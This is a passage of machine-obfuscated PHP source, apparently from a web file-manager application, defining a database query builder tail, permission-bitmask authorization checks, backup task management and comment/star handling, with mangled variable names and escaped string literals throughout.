$this->parseLock(isset($ğÉêªÚ¤[$æ¶Îò„Ó[926]]) ? $ğÉêªÚ¤[$æ¶Îò„Ó[926]] : !1); if (isset($˜»×˜Ô)) { think_cache($˜»×˜Ô, $Ü•‰Íò); } return $Ü•‰Íò; } public function parseSql($ê—«÷ö, $²ÔıÖó¾ = array()) { $Ü–³Ğ›¾ =& $_SERVER[¼èá¯æÙ]; $ê—«÷ö = str_replace(array($Ü–³Ğ›¾[1128], $Ü–³Ğ›¾[1129], $Ü–³Ğ›¾[1130], $Ü–³Ğ›¾[1131], $Ü–³Ğ›¾[1132], $Ü–³Ğ›¾[1133], $Ü–³Ğ›¾[1134], $Ü–³Ğ›¾[1135], $Ü–³Ğ›¾[1136], $Ü–³Ğ›¾[1137], $Ü–³Ğ›¾[1138]), array($this->parseTable("{$²ÔıÖó¾[$Ü–³Ğ›¾[368]]}"), $this->parseDistinct(isset($²ÔıÖó¾[$Ü–³Ğ›¾[1139]]) ? $²ÔıÖó¾[$Ü–³Ğ›¾[1139]] : !1), $this->parseField(!empty($²ÔıÖó¾[$Ü–³Ğ›¾[362]]) ? $²ÔıÖó¾[$Ü–³Ğ›¾[362]] : $Ü–³Ğ›¾[232]), $this->parseJoin(!empty($²ÔıÖó¾[$Ü–³Ğ›¾[371]]) ? $²ÔıÖó¾[$Ü–³Ğ›¾[371]] : $Ü–³Ğ›¾[12]), $this->parseWhere(!empty($²ÔıÖó¾[$Ü–³Ğ›¾[364]]) ? $²ÔıÖó¾[$Ü–³Ğ›¾[364]] : $Ü–³Ğ›¾[12]), $this->parseGroup(!empty($²ÔıÖó¾[$Ü–³Ğ›¾[589]]) ? $²ÔıÖó¾[$Ü–³Ğ›¾[589]] : $Ü–³Ğ›¾[12]), $this->parseHaving(!empty($²ÔıÖó¾[$Ü–³Ğ›¾[1140]]) ? $²ÔıÖó¾[$Ü–³Ğ›¾[1140]] : $Ü–³Ğ›¾[12]), $this->parseOrder(!empty($²ÔıÖó¾[$Ü–³Ğ›¾[453]]) ? $²ÔıÖó¾[$Ü–³Ğ›¾[453]] : $Ü–³Ğ›¾[12]), $this->parseLimit(!empty($²ÔıÖó¾[$Ü–³Ğ›¾[379]]) ? $²ÔıÖó¾[$Ü–³Ğ›¾[379]] : $Ü–³Ğ›¾[12]), $this->parseUnion(!empty($²ÔıÖó¾[$Ü–³Ğ›¾[434]]) ? $²ÔıÖó¾[$Ü–³Ğ›¾[434]] : $Ü–³Ğ›¾[12]), $this->parseComment(!empty($²ÔıÖó¾[$Ü–³Ğ›¾[441]]) ? $²ÔıÖó¾[$Ü–³Ğ›¾[441]] : $Ü–³Ğ›¾[12])), $ê—«÷ö); return $ê—«÷ö; } public function getLastSql($ëÚùÉ¾˜ = '') { return $ëÚùÉ¾˜ ? $this->modelSql[$ëÚùÉ¾˜] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ú½—¤é²) { return addslashes($ú½—¤é²); } public function setModel($íŒú¢‚ï) { $this->model = $íŒú¢‚ï; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto E¢ÄÖƒ°ÀÊ; eÌ·–Œ¶½³: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ˆĞ©¥˜ =& $_SERVER[¼èá¯æÙ]; $ï»íîÌ = array(array($ˆĞ©¥˜[505] => LNG($ˆĞ©¥˜[1980]), $ˆĞ©¥˜[1981] => $ˆĞ©¥˜[1982], $ˆĞ©¥˜[1983] => 1, $ˆĞ©¥˜[1984] => 1, $ˆĞ©¥˜[1985] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ˆĞ©¥˜[505] => LNG($ˆĞ©¥˜[1986]), $ˆĞ©¥˜[1981] => $ˆĞ©¥˜[1987], $ˆĞ©¥˜[1983] => 2, $ˆĞ©¥˜[1984] => 1, $ˆĞ©¥˜[1985] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ˆĞ©¥˜[505] => LNG($ˆĞ©¥˜[1988]), $ˆĞ©¥˜[1981] => $ˆĞ©¥˜[1989], $ˆĞ©¥˜[1983] => 3, $ˆĞ©¥˜[1984] => 1, $ˆĞ©¥˜[1985] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ˆĞ©¥˜[505] => LNG($ˆĞ©¥˜[1990]), $ˆĞ©¥˜[1981] => $ˆĞ©¥˜[1991], $ˆĞ©¥˜[1983] => 4, $ˆĞ©¥˜[1984] => 1, $ˆĞ©¥˜[1985] => self::AUTH_SHOW | self::AUTH_VIEW), array($ˆĞ©¥˜[505] => LNG($ˆĞ©¥˜[1992]), $ˆĞ©¥˜[1981] => $ˆĞ©¥˜[1993], $ˆĞ©¥˜[1983] => 5, $ˆĞ©¥˜[1984] => 1, $ˆĞ©¥˜[1985] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ˆĞ©¥˜[505] => LNG($ˆĞ©¥˜[1994]), $ˆĞ©¥˜[1981] => $ˆĞ©¥˜[1995], $ˆĞ©¥˜[1983] => 6, $ˆĞ©¥˜[1984] => 1, $ˆĞ©¥˜[1985] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ˆĞ©¥˜[505] => LNG($ˆĞ©¥˜[1996]), $ˆĞ©¥˜[1981] => $ˆĞ©¥˜[1997], $ˆĞ©¥˜[1983] => 7, $ˆĞ©¥˜[1984] => 1, $ˆĞ©¥˜[1985] => 0)); return $ï»íîÌ; } public static function authCheck($‡©‘ã£, $˜Ê•”³ö) { $£¼©Ø =& $_SERVER[¼èá¯æÙ]; $‡©‘ã£ = intval($‡©‘ã£); if (KodUser::isRoot() && $GLOBALS[$£¼©Ø[6]][$£¼©Ø[1998]]) { return !0; } if ($‡©‘ã£ <= 0) { return !1; } if (($‡©‘ã£ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($‡©‘ã£ & $˜Ê•”³ö); } public static function authCheckShow($û™øñ¦) { return self::authCheck($û™øñ¦, self::AUTH_SHOW); } public static function authCheckView($ˆ¸‹Ğ) { return self::authCheck($ˆ¸‹Ğ, self::AUTH_VIEW); } public static function authCheckDownload($—ÕÎ¼¹Ø) { return self::authCheck($—ÕÎ¼¹Ø, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ÉŸæŒîÎ) { return self::authCheck($ÉŸæŒîÎ, self::AUTH_UPLOAD); } public static function authCheckEdit($ªÃê‡¼’) { return self::authCheck($ªÃê‡¼’, self::AUTH_EDIT); } public static function authCheckRemove($¹Š¤ç§§) { return self::authCheck($¹Š¤ç§§, self::AUTH_REMOVE); } public static function authCheckShare($‘Ú¬˜Ş) { return self::authCheck($‘Ú¬˜Ş, self::AUTH_SHARE); } public static function authCheckComment($Ğ–­¨«ò) { return self::authCheck($Ğ–­¨«ò, self::AUTH_COMMENT); } public static function authCheckEvent($÷È¾Æ«…) { return self::authCheck($÷È¾Æ«…, self::AUTH_EVENT); } public static function authCheckRoot($™¼úöı‰) { return self::authCheck($™¼úöı‰, self::AUTH_ROOT); } public static function authCheckAction($€ĞÏ—Ü, $¬²üø¼‚) { $ÔÓ‰ˆÂ =& $_SERVER[¼èá¯æÙ]; $ĞŒÓˆ»Ø = array($ÔÓ‰ˆÂ[1999] => self::AUTH_VIEW, $ÔÓ‰ˆÂ[1284] => self::AUTH_DOWNLOAD, $ÔÓ‰ˆÂ[120] => self::AUTH_UPLOAD, $ÔÓ‰ˆÂ[1948] => self::AUTH_EDIT, $ÔÓ‰ˆÂ[1947] => self::AUTH_REMOVE, $ÔÓ‰ˆÂ[1958] => self::AUTH_SHARE, $ÔÓ‰ˆÂ[441] => self::AUTH_COMMENT, $ÔÓ‰ˆÂ[1765] => self::AUTH_EVENT, $ÔÓ‰ˆÂ[2000] => self::AUTH_ROOT); if (!isset($ĞŒÓˆ»Ø[$¬²üø¼‚])) { return; } $äÒçÏ‘ = $ĞŒÓˆ»Ø[$¬²üø¼‚]; $€ĞÏ—Ü = intval($€ĞÏ—Ü); if ($€ĞÏ—Ü <= 0) { return !1; } if (($€ĞÏ—Ü & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($€ĞÏ—Ü & $äÒçÏ‘); } public static function authDisable($Ø‚äæí±, $Å ŸĞ˜Ã) { if (intval($Ø‚äæí±) <= 0) { return 0; } return intval($Ø‚äæí±) & ~$Å ŸĞ˜Ã; } public $optionType = "\123\171\x73\164\145\x6d\56\163\157\165\162\143\145\x41\x75\164\150\x4c\x69\x73\164"; public $field = array("\156\141\x6d\145", "\141\x75\164\150", "\x6c\x61\142\x65\x6c", "\144\151\x73\x70\x6c\x61\171", "\163\171\163\164\145\155", "\163\157\x72\x74"); public function initData() { $“‡ç«À = $this->authDefault(); foreach ($“‡ç«À as $‰©àË…Ş) { $this->add($‰©àË…Ş); } } public function findAuth($ì±±áúÄ, $óÆ’ÖØ) { $ïµÖ³š =& $_SERVER[¼èá¯æÙ]; $çŞ…ƒ¥ä = parent::listData(); foreach ($çŞ…ƒ¥ä as $¤ÎËÈÀİ) { $‰¨²Íâ¢ = intval($¤ÎËÈÀİ[$ïµÖ³š[498]]); if ($‰¨²Íâ¢ <= 0 || $¤ÎËÈÀİ[$ïµÖ³š[2001]] == 0) { continue; } if (($‰¨²Íâ¢ & $ì±±áúÄ) != $ì±±áúÄ) { continue; } if (($‰¨²Íâ¢ & $óÆ’ÖØ) != 0) { continue; } return $¤ÎËÈÀİ[$ïµÖ³š[486]]; } return !1; } public function findAuthMax($ô²•îº£, $úèñœîË) { $™¯Úş¥ =& $_SERVER[¼èá¯æÙ]; $ÜŸïÅëÀ = !1; $‡ªÒ©É = parent::listData(); foreach ($‡ªÒ©É as $Íšî˜) { $âÆæÚ½¤ = intval($Íšî˜[$™¯Úş¥[498]]); if ($âÆæÚ½¤ <= 0 || $Íšî˜[$™¯Úş¥[2001]] == 0) { continue; } if (($âÆæÚ½¤ & $ô²•îº£) != $ô²•îº£) { continue; } if (($âÆæÚ½¤ & $úèñœîË) != 0) { continue; } if (!$ÜŸïÅëÀ) { $ÜŸïÅëÀ = $Íšî˜; continue; } if (intval($ÜŸïÅëÀ[$™¯Úş¥[498]]) < $âÆæÚ½¤) { $ÜŸïÅëÀ = $Íšî˜; } } return $ÜŸïÅëÀ ? $ÜŸïÅëÀ[$™¯Úş¥[486]] : !1; } public function findAuthReadOnly() { $“È¯ïØé = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $–ò§ØÚ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($“È¯ïØé, $–ò§ØÚ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $°ù²™îè =& $_SERVER[¼èá¯æÙ]; $óéü¬À = parent::listData(); $‚È¦ÎŒÌ = !1; foreach ($óéü¬À as $ĞâÇéœÍ) { if ($ĞâÇéœÍ[$°ù²™îè[498]] <= 0 || $ĞâÇéœÍ[$°ù²™îè[2001]] == $°ù²™îè[240]) { continue; } if (!$‚È¦ÎŒÌ) { $‚È¦ÎŒÌ = $ĞâÇéœÍ; continue; } if ($‚È¦ÎŒÌ[$°ù²™îè[498]] > $ĞâÇéœÍ[$°ù²™îè[498]]) { $‚È¦ÎŒÌ = $ĞâÇéœÍ; } } return $‚È¦ÎŒÌ ? $‚È¦ÎŒÌ[$°ù²™îè[486]] : $°ù²™îè[12]; } public function listData($ÒŒÔÕ‚Ï = false, $¢Á©Ç = "\163\157\x72\x74", $µ°Ø£ = false) { return parent::listData($ÒŒÔÕ‚Ï, $¢Á©Ç, $µ°Ø£); } public function update($·²¬ºë’, $ÚÜÍİÆ¿) { $ï¿Æ‘¥¥ =& $_SERVER[¼èá¯æÙ]; $Ûªò ¼ = parent::listData($·²¬ºë’); $ÏÒµ¡Ÿ = $this->findByName($ÚÜÍİÆ¿[$ï¿Æ‘¥¥[32]]); if (!$Ûªò ¼ || $ÏÒµ¡Ÿ && $ÏÒµ¡Ÿ[$ï¿Æ‘¥¥[486]] != $Ûªò ¼[$ï¿Æ‘¥¥[486]]) { return !1; } $this->filterAuth($ÚÜÍİÆ¿[$ï¿Æ‘¥¥[498]]); return parent::update($·²¬ºë’, $ÚÜÍİÆ¿); } public function remove($ìÓĞ÷øô) { $“³‡Õà = parent::listData($ìÓĞ÷øô); if (!$“³‡Õà || $“³‡Õà[$_SERVER[¼èá¯æÙ][201]]) { return !1; } return parent::remove($ìÓĞ÷øô); } public function add($²â”¼œ® = array()) { $îÌßå–– =& $_SERVER[¼èá¯æÙ]; if ($this->findByName($²â”¼œ®[$îÌßå––[32]])) { return !1; } $×ÓŞŞ´ = array($îÌßå––[32] => $îÌßå––[12], $îÌßå––[498] => 1, $îÌßå––[2002] => $îÌßå––[1989], $îÌßå––[2001] => 1, $îÌßå––[201] => 0, $îÌßå––[2003] => 0); $²â”¼œ® = array_merge($×ÓŞŞ´, $²â”¼œ®); $²â”¼œ®[$îÌßå––[2003]] = $this->getSort(); $this->filterAuth($²â”¼œ®[$îÌßå––[498]]); return parent::insert($²â”¼œ®); } private function getSort() { $ÅÕ¼ÜÈ =& $_SERVER[¼èá¯æÙ]; $«ÌËş“ = parent::listData(); $èĞŞİÎ = array_to_keyvalue($«ÌËş“, $ÅÕ¼ÜÈ[12], $ÅÕ¼ÜÈ[2003]); return empty($èĞŞİÎ) ? 0 : max($èĞŞİÎ) + 1; } private function filterAuth(&$°¿ºé»å) { if (!$°¿ºé»å) { return; } $ÖŠƒõ¡Õ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ä…‡›¿‹ = array(); foreach ($ÖŠƒõ¡Õ as $…ê•Àµş) { if ($°¿ºé»å & $…ê•Àµş) { $ä…‡›¿‹[] = $…ê•Àµş; } } if (in_array(self::AUTH_ROOT, $ä…‡›¿‹)) { $°¿ºé»å = array_sum($ÖŠƒõ¡Õ); return; } $¿ïÈÀó = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ä…‡›¿‹ as $…ê•Àµş) { if (isset($¿ïÈÀó[$…ê•Àµş])) { $ä…‡›¿‹ = array_merge($ä…‡›¿‹, $¿ïÈÀó[$…ê•Àµş]); } } $ä…‡›¿‹[] = self::AUTH_SHOW; $°¿ºé»å = array_sum(array_unique($ä…‡›¿‹)); } public function sort($ìÎûñ½ã, $œ³ˆ¥ü‰) { return parent::update($ìÎûñ½ã, $œ³ˆ¥ü‰); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\56\142\141\143\x6b\x75\x70\114\151\x73\x74"; public $field = array("\x69\x6f", "\x6e\x61\155\x65", "\163\164\141\164\165\x73", "\143\x6f\x6e\x74\145\156\164", "\155\x61\156\x75\141\x6c", "\162\145\163\x75\x6c\164", "\164\x69\155\x65\106\162\x6f\x6d", "\x74\x69\155\x65\x54\x6f"); public function config() { $Ìƒğ®¬ì =& $_SERVER[¼èá¯æÙ]; Action($Ìƒğ®¬ì[2004])->taskInit(); $‘¸†šÃ = Model($Ìƒğ®¬ì[852])->get($Ìƒğ®¬ì[866]); $‘¸†šÃ = json_decode($‘¸†šÃ, !0); $‘¸†šÃ = is_array($‘¸†šÃ) ? $‘¸†šÃ : array(); $this->parseContent($‘¸†šÃ); unset($‘¸†šÃ[$Ìƒğ®¬ì[1747]]); Model($Ìƒğ®¬ì[1746])->cacheClear(); $¡Äùìùô = $Ìƒğ®¬ì[2005]; $Ù†§…Êµ = Model($Ìƒğ®¬ì[2006])->findByKey($Ìƒğ®¬ì[1765], $¡Äùìùô); if (!$Ù†§…Êµ) { $Ù†§…Êµ = array(); } if (isset($Ù†§…Êµ[$Ìƒğ®¬ì[216]])) { $Ù†§…Êµ[$Ìƒğ®¬ì[216]] = json_decode($Ù†§…Êµ[$Ìƒğ®¬ì[216]], !0); } if (isset($‘¸†šÃ[$Ìƒğ®¬ì[216]])) { $Ù†§…Êµ[$Ìƒğ®¬ì[216]][$Ìƒğ®¬ì[1750]] = $‘¸†šÃ[$Ìƒğ®¬ì[216]]; unset($‘¸†šÃ[$Ìƒğ®¬ì[216]]); } return array_merge($Ù†§…Êµ, $‘¸†šÃ); } public function listData($˜ŠÏ÷¨ = false, $æ±‘àÃ– = "\155\x6f\x64\x69\x66\171\x54\x69\155\145", $Î™—Ç½Î = false) { $¼ùó™·® = parent::listData($˜ŠÏ÷¨, $æ±‘àÃ–, !0); if (!$¼ùó™·®) { return $¼ùó™·®; } if ($˜ŠÏ÷¨) { $¼ùó™·® = array($¼ùó™·®); } foreach ($¼ùó™·® as &$Œ¸èóÆ) { $this->parseContent($Œ¸èóÆ); } return $˜ŠÏ÷¨ ? $¼ùó™·®[0] : $¼ùó™·®; } public function parseContent(&$‹ùá”»ê) { $Ü®›€ºŞ =& $_SERVER[¼èá¯æÙ]; $ñËæ«™Á = _get($‹ùá”»ê, $Ü®›€ºŞ[181], $Ü®›€ºŞ[101]); if (!in_array($ñËæ«™Á, array($Ü®›€ºŞ[858], $Ü®›€ºŞ[1214]))) { $‹ùá”»ê[$Ü®›€ºŞ[181]] = $ñËæ«™Á == $Ü®›€ºŞ[101] ? $Ü®›€ºŞ[1214] : $Ü®›€ºŞ[858]; } } public function lastItem() { $â²Ìñß§ = $this->listData(); return !empty($â²Ìñß§[0]) ? $â²Ìñß§[0] : null; } public function kill($åı­øŞ) { $ºà›üøı =& $_SERVER[¼èá¯æÙ]; $­ ÛÍ‡È = $this->listData($åı­øŞ); if (!$­ ÛÍ‡È || empty($­ ÛÍ‡È[$ºà›üøı[32]])) { return !0; } Task::kill($ºà›üøı[865]); Task::kill($ºà›üøı[883]); Task::kill($ºà›üøı[892]); $şØ­ ®İ = $­ ÛÍ‡È[$ºà›üøı[32]]; $±çãö÷ = TEMP_FILES . $ºà›üøı[861] . $şØ­ ®İ . $ºà›üøı[8]; IO::remove($±çãö÷, !1); return $this->remove($åı­øŞ); } public function remove($Ññ»êœï) { $ÂÃö«™ = $this->listData($Ññ»êœï); if (!$ÂÃö«™) { return !0; } return $this->backupRemove($ÂÃö«™); } private function backupRemove($ü…ºã) { parent::remove($ü…ºã[$_SERVER[¼èá¯æÙ][486]]); $Óğëİ±à = $this->backupPath($ü…ºã); IO::remove($Óğëİ±à, !1); return !0; } private function backupPath($‰¶Í¯îÑ) { $òõƒÑ¤ =& $_SERVER[¼èá¯æÙ]; $êÕûé½… = $‰¶Í¯îÑ[$òõƒÑ¤[32]]; $Ó§£ú‰‰ = Model($òõƒÑ¤[852])->get($òõƒÑ¤[853]); $üêáĞ»ß = substr(md5($òõƒÑ¤[854] . $Ó§£ú‰‰ . $êÕûé½…), 0, 8); return "\x7b\151\157\x3a{$‰¶Í¯îÑ[$òõƒÑ¤[834]]}\175\x2f\x64\x61\164\141\x62\141\163\145\x2f\x62\x61\x63\x6b\165\x70\57" . $êÕûé½… . $òõƒÑ¤[11] . $üêáĞ»ß; } public function start() { $Æñä»Åè =& $_SERVER[¼èá¯æÙ]; if ($GLOBALS[$Æñä»Åè[6]][$Æñä»Åè[102]][$Æñä»Åè[2007]] != $Æñä»Åè[101]) { return !0; } $éÙ¸¸Û = $this->config(); if (!$éÙ¸¸Û || $éÙ¸¸Û[$Æñä»Åè[1747]] != $Æñä»Åè[101]) { return !1; } if ($éÙ¸¸Û[$Æñä»Åè[181]] == $Æñä»Åè[858]) { $ÅŠÉßµÎ = Model($Æñä»Åè[852])->get($Æñä»Åè[1329]); if ($ÅŠÉßµÎ == $Æñä»Åè[1330]) { $éÙ¸¸Û[$Æñä»Åè[181]] = $Æñä»Åè[1214]; } } $ƒ‘ªòò = $this->process(); foreach ($ƒ‘ªòò as $‘Ô²İ³Ê) { if ($‘Ô²İ³Ê) { return Task::restart($‘Ô²İ³Ê[$Æñä»Åè[486]]); } } $¡ğ›ÔÂ’ = new Backup(); $Ê°æ·ĞĞ = $¡ğ›ÔÂ’->db(); if ($Ê°æ·ĞĞ) { $Ê°æ·ĞĞ = $¡ğ›ÔÂ’->dbFile(); if ($Ê°æ·ĞĞ && $éÙ¸¸Û[$Æñä»Åè[181]] == $Æñä»Åè[858]) { $Ê°æ·ĞĞ = $¡ğ›ÔÂ’->file(); } } Backup::set(array($Æñä»Åè[832] => 1, $Æñä»Åè[843] => time())); return !0; } public function process() { $ ø¿ş†œ =& $_SERVER[¼èá¯æÙ]; $›ô†„ÉÀ = array($ ø¿ş†œ[839] => Task::get($ ø¿ş†œ[865]), $ ø¿ş†œ[844] => Task::get($ ø¿ş†œ[883]), $ ø¿ş†œ[242] => Task::get($ ø¿ş†œ[892])); $Ó±›Áü = !1; foreach ($›ô†„ÉÀ as &$¶À‘ş§ã) { if ($Ó±›Áü) { $¶À‘ş§ã = !1; continue; } if ($¶À‘ş§ã) { $ŒÕØ±¨Ê = intval(_get($¶À‘ş§ã, $ ø¿ş†œ[1783], 0)); if (time() - $ŒÕØ±¨Ê > 7200) { Task::kill($¶À‘ş§ã[$ ø¿ş†œ[486]]); $Ó±›Áü = !0; $¶À‘ş§ã = !1; } } } return $›ô†„ÉÀ; } public function restore() { $õ€ˆäš¦ =& $_SERVER[¼èá¯æÙ]; ActionCall($õ€ˆäš¦[1142], !0, 1); ActionCall($õ€ˆäš¦[1142], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\155\145\156\164"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\141\155\x65" => "\143\157\x6d\x6d\145\156\x74\137\x6d\145\164\141", "\x6d\x65\x74\x61\106\151\145\154\x64" => "\143\x6f\x6d\x6d\x65\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($–Ùİåœ) { $Êä¼Âº™ =& $_SERVER[¼èá¯æÙ]; if ($–Ùİåœ[$Êä¼Âº™[2008]]) { $ñ·¸·Ëú = $this->where(array($Êä¼Âº™[2009] => $–Ùİåœ[$Êä¼Âº™[2008]]))->find(); if (!$ñ·¸·Ëú || $ñ·¸·Ëú[$Êä¼Âº™[200]] != $–Ùİåœ[$Êä¼Âº™[200]] || $ñ·¸·Ëú[$Êä¼Âº™[580]] != $–Ùİåœ[$Êä¼Âº™[580]]) { return !1; } $this->where(array($Êä¼Âº™[2009] => $–Ùİåœ[$Êä¼Âº™[2008]]))->setAdd($Êä¼Âº™[2010], 1); } $–Ùİåœ[$Êä¼Âº™[2011]] = 0; $–Ùİåœ[$Êä¼Âº™[2010]] = 0; $–Ùİåœ[$Êä¼Âº™[832]] = 1; return $this->add($–Ùİåœ); } public function commentCount($¾ùÕÌĞ’, $©—¦Íëñ, $Ú…Ãì• = false) { $ş³ˆœ =& $_SERVER[¼èá¯æÙ]; if (!$¾ùÕÌĞ’) { return array(); } if (is_string($¾ùÕÌĞ’) || is_int($¾ùÕÌĞ’)) { $¾ùÕÌĞ’ = array($¾ùÕÌĞ’); } $áÖÑÜ¤ğ = array($ş³ˆœ[580], $ş³ˆœ[2012] => $ş³ˆœ[576]); $Áß¦æ¿õ = array($ş³ˆœ[580] => array($ş³ˆœ[7], $¾ùÕÌĞ’), $ş³ˆœ[200] => $©—¦Íëñ); if ($Ú…Ãì•) { $Áß¦æ¿õ[$ş³ˆœ[1778]] = $Ú…Ãì•; } $–Í’ÒƒÙ = $this->field($áÖÑÜ¤ğ)->where($Áß¦æ¿õ)->group($ş³ˆœ[580])->select(); return array_to_keyvalue($–Í’ÒƒÙ, $ş³ˆœ[580], $ş³ˆœ[576]); } public function starTarget($Ô‚¨×, $ú‰‹Î) { $¦Ú¯õó =& $_SERVER[¼èá¯æÙ]; $®†€æ² = $Ô‚¨× + self::TYPE_STAR_OFFSET; $àÆÖ§±Ç = array($¦Ú¯õó[1778] => USER_ID, $¦Ú¯õó[200] => $®†€æ², $¦Ú¯õó[580] => $ú‰‹Î); $–“ù é = $this->where($àÆÖ§±Ç)->find(); if ($–“ù é) { return $this->where(array($¦Ú¯õó[486] => $–“ù é[$¦Ú¯õó[486]]))->delete(); } $•º¾Ê¬ñ = array($¦Ú¯õó[2008] => 0, $¦Ú¯õó[1778] => USER_ID, $¦Ú¯õó[832] => 1, $¦Ú¯õó[181] => $¦Ú¯õó[12], $¦Ú¯õó[200] => $®†€æ², $¦Ú¯õó[580] => $ú‰‹Î, $¦Ú¯õó[2011] => 0, $¦Ú¯õó[2010] => 0); return $this->add($•º¾Ê¬ñ); } public function starTargetCount($·ªæ‰ñ, $°Š­—Ü•) { $–‡ĞÆø =& $_SERVER[¼èá¯æÙ]; $«¶û‡÷­ = $°Š­—Ü• + self::TYPE_STAR_OFFSET; $˜¡·şµŠ = $this->commentCount($·ªæ‰ñ, $«¶û‡÷­); $çüãŠ = $this->commentCount($·ªæ‰ñ, $«¶û‡÷­, USER_ID); return array($–‡ĞÆø[2013] => $˜¡·şµŠ, $–‡ĞÆø[2014] => $çüãŠ); } public function starTargetUserList($×Úì• , $¦ƒíÉ•Ë) { $ƒ¬¤ÔÑğ =& $_SERVER[¼èá¯æÙ]; $ùûå Î´ = $×Úì•  + self::TYPE_STAR_OFFSET; $³Î®Û€˜ = array($ƒ¬¤ÔÑğ[580] => $¦ƒíÉ•Ë, $ƒ¬¤ÔÑğ[200] => $ùûå Î´); $ö ç×Ââ = $this->where($³Î®Û€˜)->count(); $ˆÛ½¤ïË = array($ƒ¬¤ÔÑğ[344] => $ö ç×Ââ, $ƒ¬¤ÔÑğ[2015] => array()); if (!$ö ç×Ââ) { return $ˆÛ½¤ïË; } $ÙºÍ…˜“ = $this->field($ƒ¬¤ÔÑğ[1778])->where($³Î®Û€˜)->limit(500)->select(); $ÙºÍ…˜“ = array_to_keyvalue($ÙºÍ…˜“, $ƒ¬¤ÔÑğ[12], $ƒ¬¤ÔÑğ[1778]); $ˆÛ½¤ïË[$ƒ¬¤ÔÑğ[2015]] = Model($ƒ¬¤ÔÑğ[588])->userListInfo($ÙºÍ…˜“); return $ˆÛ½¤ïË; } public function prasiseUserList($œëÀÃÚ–) { $·¥ä™Ÿö =& $_SERVER[¼èá¯æÙ]; $íù¸˜ó© = array($·¥ä™Ÿö[2016] => $œëÀÃÚ–); $“š’‘§í = $this->where($íù¸˜ó©)->find(); $İ£õÚ‚ = _get($“š’‘§í, $·¥ä™Ÿö[2011], 0); $‹Åø†ú­ = array($·¥ä™Ÿö[344] => $İ£õÚ‚, $·¥ä™Ÿö[2015] => array()); if (!$İ£õÚ‚) { return $‹Åø†ú­; } $Ë…øºø¨ = Model($·¥ä™Ÿö[2017])->field($·¥ä™Ÿö[1778])->where($íù¸˜ó©)->limit(500)->select(); $Ë…øºø¨ = array_to_keyvalue($Ë…øºø¨, $·¥ä™Ÿö[12], $·¥ä™Ÿö[1778]); $‹Åø†ú­[$·¥ä™Ÿö[2015]] = Model($·¥ä™Ÿö[588])->userListInfo($Ë…øºø¨); return $‹Åø†ú­; } public function remove($ûÈ ˜í) { $÷èúèç =& $_SERVER[¼èá¯æÙ]; $•¸şèè³ = array($÷èúèç[2009] => $ûÈ ˜í); $—ĞÈ”ìş = $this->where($•¸şèè³)->find(); if ($—ĞÈ”ìş[$÷èúèç[2008]]) { $this->where(array($÷èúèç[2009] => $—ĞÈ”ìş[$÷èúèç[2008]]))->setAdd($÷èúèç[2010], -1); } return $this->where($•¸şèè³)->delete(); } public function edit($²œ¶›òÖ, $ãï œ½¢) { $Ğš‹œ¶û =& $_SERVER[¼èá¯æÙ]; $¡¿ïÆªë = array($Ğš‹œ¶û[2009] => $²œ¶›òÖ); return $this->where($¡¿ïÆªë)->save(array($Ğš‹œ¶û[2018] => $ãï œ½¢)); } public function prasise($Ó£¡š“Î) { $›ˆ»ˆ¶ú =& $_SERVER[¼èá¯æÙ]; $Â¾ì¸Ş¤ = Model($›ˆ»ˆ¶ú[2019]); $…ŠäÙÖÀ = 